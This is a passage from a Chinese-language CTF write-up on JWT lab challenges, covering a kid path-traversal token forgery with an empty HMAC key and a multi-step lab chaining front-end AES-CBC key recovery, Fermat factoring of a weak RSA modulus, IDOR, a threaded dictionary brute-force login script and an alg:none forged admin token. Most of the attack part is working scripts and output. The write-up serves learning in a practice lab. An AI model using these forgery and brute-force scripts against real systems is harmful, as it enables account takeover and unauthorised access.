        const payload = jwt.verify(token, secretKey, { algorithms: ['HS256'] });
      
        req.user = payload; // 将用户信息挂载到请求上
        next();
    } catch (err) {
        res.status(403).send("Invalid Token or Key Error");
    }
}

// 目标接口：下单买商品
app.post('/api/order', authenticate, (req, res) => {
    // 只有经过篡改，这里 req.user.username 才会是 "mht"
    res.json({
        status: "success",
        message: `下单成功！用户 [${req.user.username}] 已成功购买了 1 件商品。`
    });
});
```

### 解题

1. 依旧注册用户获取 jwt，查看 jwt 结构，加密算法是 HS256

![image](https://img2.eval.moe/image-20260702000715-q1eaemd.png)

2. 写脚本，或者借用脚本

```javascript
# Demo script for 'JWT Authentication Bypass via kid Header Path Traversal' video: https://youtu.be/78FIFrOi4Os
import jwt

# Paste JWT token here
token = 'INSERT_TOKEN_HERE'

# Decode the token (without verifying)
decoded_token = jwt.decode(token, options={"verify_signature": False})
print(f"Decoded token: {decoded_token}\n")

# Modify the token (JWT manipulation)
decoded_token['sub'] = 'administrator'
print(f"Modified payload: {decoded_token}\n")

# Generate a new token with the modified payload and added header parameter (re-encode)
modified_token = jwt.encode(decoded_token, '', algorithm='HS256', headers={"kid": "../../../dev/null"})
print(f"Modified token: {modified_token}\n")
```

脚本运行报错了，查了 ai 说是在较新的 PyJWT 版本中（具体是从 2.4.0 版本开始），为了防止开发者意外配置空密钥以及防御此类空密钥攻击，官方在底层源码中强行加入了一个安全校验：**严禁使用空字符串（****`""`****）或空字节作为 HMAC 算法（如 HS256）的签名密钥**。：

```javascript
Traceback (most recent call last):
  File "C:\Users\admse\Documents\MISC\temp\main.py", line 16, in <module>
    modified_token = jwt.encode(decoded_token, key='', algorithm='HS256')
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\admse\Documents\MISC\temp\.venv\Lib\site-packages\jwt\api_jwt.py", line 147, in encode
    return self._jws.encode(
           ^^^^^^^^^^^^^^^^^
  File "C:\Users\admse\Documents\MISC\temp\.venv\Lib\site-packages\jwt\api_jws.py", line 199, in encode
    key = alg_obj.prepare_key(key)
          ^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\admse\Documents\MISC\temp\.venv\Lib\site-packages\jwt\algorithms.py", line 329, in prepare_key
    raise InvalidKeyError("HMAC key must not be empty.")
jwt.exceptions.InvalidKeyError: HMAC key must not be empty.
Decoded token: {'username': 'aaa', 'iat': 1782922014}

Modified payload: {'username': 'mht', 'iat': 1782922014}
```

使用 ai 原生实现了一下：

```javascript
import json
import base64
import hmac
import hashlib

# 1. 构造你要修改的 Header 和 Payload
header = {
    "typ": "JWT",
    "alg": "HS256",
    "kid": "../../../dev/null"
}

payload = {
    "username": "mht",
    "iat": 1782922014
}

# 辅助函数：标准的 Base64Url 编码
def b64url_encode(data):
    return base64.urlsafe_b64encode(data).replace(b'=', b'').decode('utf-8')

# 2. 将 Header 和 Payload 序列化并进行 Base64Url 编码
header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')).encode('utf-8'))
payload_b64 = b64url_encode(json.dumps(payload, separators=(',', ':')).encode('utf-8'))

# 拼接前两段
unsigned_token = f"{header_b64}.{payload_b64}"

# 3. 使用"空字节"作为密钥进行 HMAC-SHA256 签名 (原生库允许空密钥)
empty_key = b""
signature = hmac.new(empty_key, unsigned_token.encode('utf-8'), hashlib.sha256).digest()

# 将签名进行 Base64Url 编码
signature_b64 = b64url_encode(signature)

# 4. 拼接生成最终的恶意 JWT
modified_token = f"{unsigned_token}.{signature_b64}"

print(f"Decoded payload: {payload}\n")
print(f"Modified token: {modified_token}\n")
```

输出：

```javascript
Decoded payload: {'username': 'mht', 'iat': 1782922014}

Modified token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uL2Rldi9udWxsIn0.eyJ1c2VybmFtZSI6Im1odCIsImlhdCI6MTc4MjkyMjAxNH0.XZOnkGC88bi02pcLwKUhHDP2OJjph31Di3qNZO-aT5I
```

3. 拿到 flag

![image](https://img2.eval.moe/image-20260702001812-2kess8o.png)

## JWT专题七：越权密钥

### 题目

环境来自：雾島风起時

类型：综合 Web 安全靶场

背景设定：三角洲行动游戏陪玩下单平台

### 场景描述

平台模拟了完整的用户注册登录、打手匹配下单、客服会话等真实业务流程，但在前端加密逻辑、用户标识传输、接口鉴权等环节故意引入了多处安全缺陷。

挑战者需要从前端 JavaScript 中逆向 AES-CBC 加密参数完成登录，分解弱 RSA 公钥还原打手加密标识实现 IDOR 越权，从客服聊天记录中挖掘隐藏报酬接口路径，最终通过伪造 JWT Token 提权至管理员身份获取 Flag。

### 攻击链路径

1. 前端加密逆向 — 逆向 AES-CBC 加密参数完成登录
2. IDOR 越权 — 分解弱 RSA 公钥还原打手加密标识，实现越权操作
3. 敏感信息挖掘 — 从客服聊天记录中挖掘隐藏报酬接口路径
4. JWT 伪造提权 — 通过 alg:none 绕过或利用硬编码签名密钥伪造令牌，提权至管理员
5. 获取 Flag

### 考察知识点

* 前端加密逆向
* 不安全直接对象引用 (IDOR)
* JWT 安全机制
* 弱密钥利用
* 敏感信息泄露

本靶场综合考察 Web 安全核心能力。

### 解题

> 因为没什么思路，看了下攻略：https://duckpigdog.github.io/2026/05/07/%E4%BD%A0%E7%9A%84%E9%AD%94%E7%8E%8B%E6%8A%A4%E4%B8%80%E8%88%AC/

登录界面摁 F12 会提示 debugger，我是在 debugger 语句所在的行的行号上单击鼠标右键，此时会出现一个快捷菜单，选择 Add conditional breakpoint 选项，输入 false 进行绕过的。

参考文章：https://www.cnblogs.com/liyuanhong/articles/18210072

![image](https://img2.eval.moe/image-20260702002541-nj3bj03.png)

在关键的地方打上断点，输入账号密码，注册一个普通用户进行登录

![image](https://img2.eval.moe/image-20260702004443-6bbsnam.png)

这题比较简单，直接控制台输入 IV 的变量，密钥就出来了

![image](https://img2.eval.moe/image-20260702004558-oqib3r4.png)

转为 ascii 字符：16-byte-login-iv，这里先存着，暂时不知道有什么用

回头发现登录的时候收到了两个 token

在选择打手页面发现了这个 api 返回所有打手信息，可惜 username 是加密的

发现功能点基本都是在 /static/js 这个目录下的，接下来爆破一下目录

![image](https://img2.eval.moe/image-20260702230338-3bxxzcu.png)

爆破目录看到了 api.js

访问看到的是一堆经过混淆后的代码，用 ai 进行还原

![image](https://img2.eval.moe/image-20260702231447-n9bf8f1.png)

看到了两个接口路径，其中第一个尝试了返回 404，访问第二个接口提示 `missing or invalid X-Access-Token`，还记得我们登录的时候有 X-Access-Token，补上

![image](https://img2.eval.moe/image-20260702231538-hqt9e2p.png)

补上之后返回了 rsa 公钥

将公钥扔给 ai，得到 e = `65537 `，以及 n = `F31D382F7C1FEC467629D8FFB5F5313DE6513DAB6F524AE7B903068EA30970AD70801FAB5685B32750F3F3AA730E639A02E587D83AAA3DF941DE8FD7178BA553`，转换成十进制为：`12732920605600028117810520777290632515406900458295844114646658469338740536327294243830128366985242460116666201456035915981254198267373057245094514617197907`

将其转为 10 进制，然后放到在线网站 [factordb.com/index.php](https://factordb.com/index.php) 看看有没有记录：

将结果直接给 ai，ai 说：

请看截图里 `Result:` 下面那行最核心的公式：

`1273292060...43 <155> = 37 * 61 * 3259 * 1731059961...61 <148>`

* **`<155>`**：代表你原本的十进制数 n 有 155 位长。
* **`37 * 61 * 3259`**：FactorDB 顺手帮你除以了几个极小的质数。
* **`<148>`**：剩下的那个 148 位长的数字。
* **状态** **`CF`**：在 FactorDB 中，`CF` 的意思是 **Composite Factored（已部分分解的合数）**。也就是说，最后那个 148 位的数字**仍然是一个合数（还能继续拆）**，但 FactorDB 的数据库里目前没有记录它完全拆解后的结果。如果完全分解了，状态会显示为 `FF` (Fully Factored)。

总结来说就是失败了

没办法了，只能使用开源工具 yafu 对 n 进行暴力破解：[github.com/bbuhrow/yafu/releases/tag/v3.1.7](https://github.com/bbuhrow/yafu/releases/tag/v3.1.7)

```javascript
.\yafu-x64.exe "factor(0xF31D382F7C1FEC467629D8FFB5F5313DE6513DAB6F524AE7B903068EA30970AD70801FAB5685B32750F3F3AA730E639A02E587D83AAA3DF941DE8FD7178BA553)"
```

输出：

```javascript
.\yafu-windows-avx2.exe "factor(0xF31D382F7C1FEC467629D8FFB5F5313DE6513DAB6F524AE7B903068EA30970AD70801FAB5685B32750F3F3AA730E639A02E587D83AAA3DF941DE8FD7178BA553)"
warning: could not open yafu.ini, no options parsed


fac: factoring 12732920605600028117810520777290632515406900458295844114646658469338616205518191797169589521423205754906641087418336579051894082273149767370841381273314643
fac: using pretesting plan: normal
fac: no tune info: using qs/gnfs crossover of 95 digits
fac: no tune info: using qs/snfs crossover of 95 digits
div: primes less than 10000
fmt: 1000000 iterations
rho: x^2 + 3, starting 1000 iterations on C148
rho: x^2 + 2, starting 1000 iterations on C148
rho: x^2 + 1, starting 1000 iterations on C148
nfs: searching for brent special forms...
nfs: searching for homogeneous cunningham special forms...
nfs: searching for XYYXF special forms...
nfs: searching for direct special forms...
nfs: snfs form detection took 0.032732 seconds
nfs: couldn't find special form
fac: job type determined to be gnfs
pm1: starting B1 = 150K, B2 = gmp-ecm default on C148
ecm: 34/34 curves on C148, B1=2k, B2=gmp-ecm default
ecm: 86/86 curves on C148, B1=11k, B2=gmp-ecm default
Programs> =gmp-ecm default, ETA: 13 sec
```

也失败了，这时候有点怀疑人生了，然后认识到了费马分解法，这是 ai 的介绍：

![image](https://img2.eval.moe/image-20260703002311-izk01ls.png)

让 ai 写了一个费马分解法的脚本：

```javascript
import math

n_148 = 12732920605600028117810520777290632515406900458295844114646658469338740536327294243830128366985242460116666201456035915981254198267373057245094514617197907

def fermat_factor(n):
    print("[*] 正在执行费马分解...")
    # 对 N 开平方根取整
    a = math.isqrt(n)
    b2 = a * a - n

    # 寻找 a^2 - N = b^2 (即寻找完全平方数)
    while b2 < 0 or math.isqrt(b2) ** 2 != b2:
        a += 1
        b2 = a * a - n

    b = math.isqrt(b2)
    p = a - b
    q = a + b
    return p, q


p, q = fermat_factor(n_148)

print(f"\n[+] 分解成功！")
print(f"P = {p}")
print(f"Q = {q}")
```

输出：

```javascript
[*] 引擎点火，准备榨干 CPU，正在挂载监控面板...

[🚀] 耗时: 0.6s | 搜索偏移量: +-112,840,243,732,455,789,648,197,748,865,738,103,507,498,045,177,858,510,412,061,303,578,314,103,848,960 | 速度: -225,680,487,464,911,579,296,395,497,731,476,207,014,996,090,355,717,020,824,122,607,156,628,207,697,920 次/秒 

[+] 爆破成功！
[-] 总耗时: 0.616847 秒
P = 112840243732455789648197748865738103507498045177858510412060728452781414555669
Q = 112840243732455789648197748865738103507498045177858510412060728452781414556103

```

总的来说如果 p 和 q 的值离得近，比如我这个，78 位的 p 和 q，前面 74 位都一样，差值只有 434，那就可以用这个方法

那话又说回来，那为什么神级工具都会卡死？

出题人极其阴险，他在原本可以直接秒杀的 P×Q 外面，额外乘上了三个很小的质数（`37 * 61 * 3259`），凑成了最初的那个 155 位的模数 N。

1. 当 Yafu 或 Alpertron 拿到 155 位的 N 时，它们会在一开始执行快速的费马检测。但因为有那三个小质数捣乱，N 的平方根附近根本找不到答案，检测失败。
2. 随后工具除掉了小质数，拿到了剩下的 148 位纯正的 P×Q。
3. 但此时，工具的内部逻辑已经切换成了对抗“常规大素数”的重型武器（ECM / GNFS），**它们不会再对这个 148 位的结果回头去做哪怕一次最简单的开平方检测。**

现在得到了 n，e，p，q，事实上我们已经破解了这个 rsa 算法了，剩下的事情就是用这些参数计算私钥，然后将从 /api/order/available-boosters 接口响应里获得的 username 参数填进去：

```javascript
import base64
from Crypto.Cipher import PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Util.number import inverse

# 1. 填入你分解出的两个质数 P 和 Q
# 这里的 P 和 Q 是我们刚刚通过费马分解法在 0.01 秒内计算出来的
P = 112840243732455789648197748865738103507498045177858510412060728452781414555669
Q = 112840243732455789648197748865738103507498045177858510412060728452781414556103

# 公钥指数 E，通常是 65537 (即 0x10001)
E = 65537

# 2. 待解密的密文列表
# 把题目给你的密文（通常是一长串无规律的字符）填进这个数组的引号里
ENC = [
    "PGWsN9DkY7GrpZVrRrwOPbt31Wpt+9bk8zBdkA/6E0/ROqjHAs+c6EPTBFjlH3OWRQ/vnMWhJanNg/7PHdH8Pg==",  # 在这里填入你的 Base64 密文
    "G4vgkvh20I21S52FhYLgdtiM7fjwBfyYyARujlyfZnjU28lJVDOkcY/h9owcCTTwye/9dDT2hpeq0Pz8yJ+7aw==",
    "aXTMPBUfGu8qfD9AFGZySfIdE29NOW3kGNI5og7IUPdCWns5Nma70T1WZK4NdjcFovBvom2/YKOuL7f7OUT/fA=="
]

# 3. 核心数学计算：推导私钥 d
# 计算模数 n (即公钥的一部分)
n = P * Q
# 计算私钥 d
# 原理：计算 E 关于欧拉函数 phi(n) 的模反元素
# phi(n) 的计算公式是 (P - 1) * (Q - 1)
d = inverse(E, (P - 1) * (Q - 1))

# 4. 构造 RSA 密钥对象
# 使用 pycryptodome 库，将 n, E, d, P, Q 组合成一个完整的 RSA 密钥对象
key = RSA.construct((n, E, d, P, Q))

# 5. 设置解密模式
# 初始化 PKCS1_v1_5 解密器
# 这是实际应用中最常用的一种 RSA 填充机制，防止被已知明文攻击
cipher = PKCS1_v1_5.new(key)

# 6. 批量解密过程
usernames = []
# 遍历列表中的每一个密文
for c in ENC:
    if not c:
        continue  # 跳过空字符串

    # 第一步：先将密文从 Base64 编码还原成原始的字节流 (bytes)
    raw_cipher_bytes = base64.b64decode(c)

    # 第二步：使用私钥进行解密
    # sentinel 是一个占位符对象。如果解密失败（比如密钥不对、密文被篡改或填充格式错误），
    # decrypt 函数不会直接崩溃报错，而是会返回我们设置的这个 sentinel 对象。
    plain = cipher.decrypt(raw_cipher_bytes, sentinel := object())

    # 第三步：检查解密是否成功
    if plain is sentinel:
        raise ValueError("解密失败：密文损坏或密钥不匹配")

    # 第四步：将解密出的字节流解码为 UTF-8 字符串，并存入列表
    usernames.append(plain.decode())

# 7. 输出最终结果
print("解密结果：")
print(usernames)
```

输出：

```javascript
解密结果：
['kilo', 'raven', 'merc']
```

得到了用户名，再加上上面分析出来的 iv 以及 AES-CBC 模式，我们可以写脚本爆破该用户的密码，先爆破 kilo 用户的密码，看脚本：

```javascript
import argparse
import base64
import json
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad


LOGIN_AES_KEY = bytes(
    [0x44, 0x46, 0x2D, 0x6C, 0x6F, 0x67, 0x69, 0x6E, 0x2D, 0x6B, 0x65, 0x79, 0x2D, 0x31, 0x36, 0x21]
)
LOGIN_AES_IV = bytes(
    [0x31, 0x36, 0x2D, 0x62, 0x79, 0x74, 0x65, 0x2D, 0x6C, 0x6F, 0x67, 0x69, 0x6E, 0x2D, 0x69, 0x76]
)


def encrypt_password(password: str) -> str:
    cipher = AES.new(LOGIN_AES_KEY, AES.MODE_CBC, LOGIN_AES_IV)
    ciphertext = cipher.encrypt(pad(password.encode("utf-8"), AES.block_size))
    return base64.b64encode(ciphertext).decode("ascii")


def build_headers(base_url: str, user_agent: str):
    origin = base_url.rstrip("/")
    return {
        "Accept": "*/*",
        "Content-Type": "application/json",
        "Origin": origin,
        "Referer": f"{origin}/login",
        "User-Agent": user_agent,
    }


def attempt_login(session: requests.Session, base_url: str, username: str, password: str, timeout: int, headers: dict):
    encrypted_password = encrypt_password(password)
    payload = {"username": username, "password": encrypted_password}
    response = session.post(
        f"{base_url.rstrip('/')}/api/account/login",
        headers=headers,
        json=payload,
        timeout=timeout,
    )
    return password, payload, response


def iter_passwords(wordlist_path: str):
    path = Path(wordlist_path)
    with path.open("r", encoding="utf-8", errors="ignore") as handle:
        for line in handle:
            candidate = line.strip("\r\n")
            if not candidate:
                continue
            yield candidate


def main():
    parser = argparse.ArgumentParser(description="模拟前端 AES-CBC 登录并支持基于字典爆破")
    parser.add_argument("--base-url", default="http://172.24.15.213:8000", help="目标站点地址，例如 http://127.0.0.1:8000")
    parser.add_argument("--username", required=True, help="登录用户名")
    parser.add_argument("--password", help="单个明文密码（不爆破时使用）")
    parser.add_argument("--wordlist", help="密码字典路径，例如 rockyou.txt（启用爆破）")
    parser.add_argument("--timeout", type=int, default=10, help="请求超时时间，单位秒")
    parser.add_argument("--threads", type=int, default=8, help="并发线程数（爆破时使用）")
    parser.add_argument("--max", type=int, default=0, help="最多尝试多少条密码（0 表示不限制）")
    parser.add_argument("--delay", type=float, default=0.0, help="每次请求之间的延迟秒数（爆破时使用）")
    parser.add_argument("--user-agent", default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36", help="User-Agent")
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    headers = build_headers(base_url, args.user_agent)

    if args.wordlist:
        stop_event = threading.Event()
        attempts = 0

        def worker(password: str):
            nonlocal attempts
            if stop_event.is_set():
                return None
            if args.max and attempts >= args.max:
                stop_event.set()
                return None
            if args.delay:
                time.sleep(args.delay)
            with attempts_lock:
                if args.max and attempts >= args.max:
                    stop_event.set()
                    return None
                attempts += 1
            with requests.Session() as session:
                pw, payload, response = attempt_login(session, base_url, args.username, password, args.timeout, headers)
            ok = response.status_code == 200
            data = {}
            try:
                data = response.json()
            except ValueError:
                data = {}
            if ok and data.get("access_token"):
                return {"password": pw, "payload": payload, "response": data}
            return None

        attempts_lock = threading.Lock()
        print(f"[*] Brute force: {args.username} @ {base_url} | wordlist={args.wordlist} | threads={args.threads}")

        with ThreadPoolExecutor(max_workers=max(1, args.threads)) as executor:
            futures = []
            for pw in iter_passwords(args.wordlist):
                if stop_event.is_set():
                    break
                futures.append(executor.submit(worker, pw))
                if args.max and len(futures) >= args.max:
                    break

            for future in as_completed(futures):
                result = future.result()
                if result:
                    stop_event.set()
                    print("[+] Found password:")
                    print(result["password"])
                    print("[+] Request JSON:")
                    print(json.dumps(result["payload"], ensure_ascii=False))
                    print("[+] Response JSON:")
                    print(json.dumps(result["response"], ensure_ascii=False, indent=2))
                    return

        print("[!] No password found")
        return

    if not args.password:
        raise SystemExit("需要提供 --password 或 --wordlist")

    with requests.Session() as session:
        password, payload, response = attempt_login(session, base_url, args.username, args.password, args.timeout, headers)

    print("[*] Request JSON:")
    print(json.dumps(payload, ensure_ascii=False, indent=2))
    print(f"[*] HTTP {response.status_code}")
    print("[*] Response JSON:")
    try:
        print(json.dumps(response.json(), ensure_ascii=False, indent=2))
    except ValueError:
        print(response.text)


if __name__ == "__main__":
    main()

```

命令行执行：

```javascript
python .\main.py --base-url http://ulab.bdziyi.cn:20682 --username kilo --wordlist 'rockyou.txt'
```

输出：

```javascript
[+] 💥 Password Found!
    -> letmein
[+] Request JSON:
{"username": "kilo", "password": "9Y0I5DD+U5ymnvO0KJ4HTQ=="}
[+] Response JSON:
{
  "access_token": "U9wOqyuMFiVoK4sVS9RkdgTO-cgO7J81",
  "message": "登录成功",
  "money_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImtpbG8iLCJyb2xlIjoiYm9vc3RlciIsInNjb3BlIjoicmV3YXJkIn0.JkgjdRX5cJ8kBC3RrtVK5KPz6tLx9nwj9YUU4WwGjmw",
  "money_token_header": "Authorization",
  "redirect_to": "/accept",
  "session_token": "bd980094005931247a729f84e9b0bfdf",
  "token_header": "X-Access-Token",
  "user": {
    "display_name": "Kilo北栈",
    "role": "booster",
    "role_label": "打手",
    "username": "kilo"
  }
}
```

登录了之后发现客户对话，将客服对话 url 里的 localhost 改为靶机网址，直接访问返回 401

观察历史包发现每次访问都会带上 x-access-token 和 jwt，加上这两个之后访问返回 403

联想到空算法漏洞，利用 JWT `alg: none` 伪造 `admin` 身份，越权读取

```javascript
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwic2NvcGUiOiJyZXdhcmQifQ.
```

![image](https://img2.eval.moe/image-20260703011621-mo7c9vm.png)

## JWT 专题总结

JWT 专题用了大概四天的时间完成了，速度一般般吧，因为内容说实话也不算多，无非就几个，改头部、改 payload、改 jwk、改 jku 等等，不过学到的东西还是很多的，特别是思路方面，最好是要了解一下业务代码是怎么写的，然后再用逆向思维去想，这样写会导致什么漏洞，如何构造 payload，如何修复等等。

内容也总结一下：

* 改 payload：开发人员只是 decode 取出 payload 里的 username 等信息，而不先对签名进行验证 verify
* 改头部：也就是改 alg，将 alg 改为 none，如果服务器信任客户端发来的 alg，就会导致此漏洞
* 改 jwk：服务器依赖 jwt 中的 jwk 指定的密钥验证签名，且该密钥客户端可随意设置
* 改 jku：服务端依赖 jku，向指定的 url 进行密钥认证，且客户端对 jku 可控
* 改 kid：开发人员将每个时期的 HMAC 密钥保存在服务器本地的 `/var/app/keys/` 目录下且未对该路径进行验证，客户端对这个参数可控，即可将将路径改为 `../../../../dev/null` 将 `alg` 指定为 `none`
